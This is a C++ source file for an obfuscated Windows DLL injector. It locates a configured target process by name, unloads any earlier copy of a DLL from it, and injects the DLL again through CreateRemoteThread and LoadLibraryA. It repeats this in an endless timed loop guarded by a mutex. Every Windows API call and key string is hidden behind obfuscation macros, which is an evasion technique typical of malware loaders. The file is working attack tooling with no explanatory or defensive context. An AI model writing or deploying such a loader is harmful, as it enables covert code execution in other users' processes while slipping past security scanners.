#include <WS2tcpip.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include "utils.h"
#include <iostream>
#include <algorithm>
#include "config.h"
#include "AutoHandle.h"

#define DLL_PATH __argv[1]


bool inject(DWORD pid, const char* dll_store_path) {
    get_proc_address_type get_proc_address = WINAPI_OBFUSCATE(get_proc_address_type, "GetProcAddress", "kernel32");
    get_module_handle_type get_module_handle = WINAPI_OBFUSCATE(get_module_handle_type, "GetModuleHandleW", "kernel32");
    close_handle_type close_handle = WINAPI_OBFUSCATE(close_handle_type, "CloseHandle", "kernel32");
    write_process_memory_type write_process_memory = WINAPI_OBFUSCATE(write_process_memory_type, "WriteProcessMemory", "kernel32");
    virtual_free_ex_type virtual_free_ex = WINAPI_OBFUSCATE(virtual_free_ex_type, "VirtualFreeEx", "kernel32");
    create_remote_thread_type create_remote_thread = WINAPI_OBFUSCATE(create_remote_thread_type, "CreateRemoteThread", "kernel32");
    AutoHandle hProcess = WINAPI_OBFUSCATE(open_process_type, "OpenProcess", "kernel32")(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        return false;
    }
    // Get the address of LoadLibraryA in the target process
    LPVOID loadLibraryAddr = (LPVOID)get_proc_address(get_module_handle(OBFUSCATE(L"kernel32.dll")), OBFUSCATE("LoadLibraryA"));
    if (loadLibraryAddr == NULL) {
        return false;
    }

    // Allocate memory for the DLL data in the target process
    LPVOID remoteDllData = WINAPI_OBFUSCATE(virtual_alloc_ex_type, "VirtualAllocEx", "kernel32")(hProcess, NULL, strlen(dll_store_path), MEM_COMMIT, PAGE_READWRITE);
    if (remoteDllData == NULL) {
        return false;
    }

    // Write the DLL data to the allocated memory in the target process
    if (!write_process_memory(hProcess, remoteDllData, dll_store_path, strlen(dll_store_path), NULL)) {
        virtual_free_ex(hProcess, remoteDllData, 0, MEM_RELEASE);
        return false;
    }

    // Create a remote thread in the target process to load the DLL
    AutoHandle hThread = create_remote_thread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteDllData, 0, NULL);
    if (hThread == NULL) {
        virtual_free_ex(hProcess, remoteDllData, 0, MEM_RELEASE);
        return false;
    }

    return true;
}

bool free_library_ex(DWORD pid, HMODULE address) {
    get_proc_address_type get_proc_address = WINAPI_OBFUSCATE(get_proc_address_type, "GetProcAddress", "kernel32");
    get_module_handle_type get_module_handle = WINAPI_OBFUSCATE(get_module_handle_type, "GetModuleHandleW", "kernel32");
    close_handle_type close_handle = WINAPI_OBFUSCATE(close_handle_type, "CloseHandle", "kernel32");
    write_process_memory_type write_process_memory = WINAPI_OBFUSCATE(write_process_memory_type, "WriteProcessMemory", "kernel32");
    virtual_free_ex_type virtual_free_ex = WINAPI_OBFUSCATE(virtual_free_ex_type, "VirtualFreeEx", "kernel32");
    create_remote_thread_type create_remote_thread = WINAPI_OBFUSCATE(create_remote_thread_type, "CreateRemoteThread", "kernel32");
    AutoHandle hProcess = WINAPI_OBFUSCATE(open_process_type, "OpenProcess", "kernel32")(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        return false;
    }
    // Get the address of LoadLibraryA in the target process
    LPVOID freeLibraryAddr = (LPVOID)get_proc_address(get_module_handle(OBFUSCATE(L"kernel32.dll")), OBFUSCATE("FreeLibrary"));
    if (freeLibraryAddr == NULL) {
        return false;
    }

    // Create a remote thread in the target process to load the DLL
    AutoHandle hThread = create_remote_thread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)freeLibraryAddr, address, 0, NULL);
    if (hThread == NULL) {
        return false;
    }

    return true;
}

bool free_if_loaded(DWORD pid, const char* dll_store_path) {
    open_process_type open_process = WINAPI_OBFUSCATE(open_process_type, "OpenProcess", "kernel32");
    enum_process_modules_type enum_process_modules = WINAPI_OBFUSCATE(enum_process_modules_type, "EnumProcessModules", "psapi");
    get_module_filename_ex_a_type get_module_filename_ex = WINAPI_OBFUSCATE(get_module_filename_ex_a_type, "GetModuleFileNameExA", "psapi");
    HMODULE hMods[1024];
    AutoHandle hProcess;
    DWORD cbNeeded;
    hProcess = open_process(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE, pid);
    if (NULL == hProcess) {
        return false;
    }

    if (enum_process_modules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (size_t i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char szModName[MAX_PATH];
            if (get_module_filename_ex(hProcess, hMods[i], szModName, sizeof(szModName))) {
                if (strcmp(szModName, dll_store_path) == 0) {
                    free_library_ex(pid, hMods[i]);
                    return true;
                }
            }
        }
    }
    return false;
}


DWORD get_pid(const char* process_name) {
    DWORD pid = 0;
    create_toolhelp_snapshot_type create_toolhelp_snapshot = WINAPI_OBFUSCATE(create_toolhelp_snapshot_type, "CreateToolhelp32Snapshot", "kernel32");
    process32_first_type process32_first = WINAPI_OBFUSCATE(process32_first_type, "Process32First", "kernel32");
    process32_next_type process32_next = WINAPI_OBFUSCATE(process32_next_type, "Process32Next", "kernel32");
    close_handle_type close_handle = WINAPI_OBFUSCATE(close_handle_type, "CloseHandle", "kernel32");

    AutoHandle hSnapshot = create_toolhelp_snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (process32_first(hSnapshot, &pe32)) {
        do {
            std::string name = std::string(reinterpret_cast<char*>(pe32.szExeFile));
            std::transform(name.begin(), name.end(), name.begin(), ::tolower); // to lower
            if (strcmp(name.c_str(), process_name) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (process32_next(hSnapshot, &pe32));
    }
    return pid;
}

int CALLBACK WinMain(HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR p_cmd_line, int n_cmd_show) {
    if (__argc != 2) {
        return 0;
    }
    initilize_winapi();
    create_mutex_a_type create_mutex_a = WINAPI_OBFUSCATE(create_mutex_a_type, "CreateMutexA", "kernel32");
    sleep_type sleep = WINAPI_OBFUSCATE(sleep_type, "Sleep", "kernel32");

    while (1) {
        AutoHandle mutex = create_mutex_a(0, false, MUTEX_NAME);
        if (nullptr == mutex) {
            continue;
        }
        mutex.~AutoHandle();
        const auto pid = get_pid(PROCESS_NAME);
        free_if_loaded(pid, DLL_PATH);
        bool result = inject(pid, DLL_PATH);

        sleep(1000 * SLEEP_BETWEEN_INJECTIONS);
    }
    return 0;
}
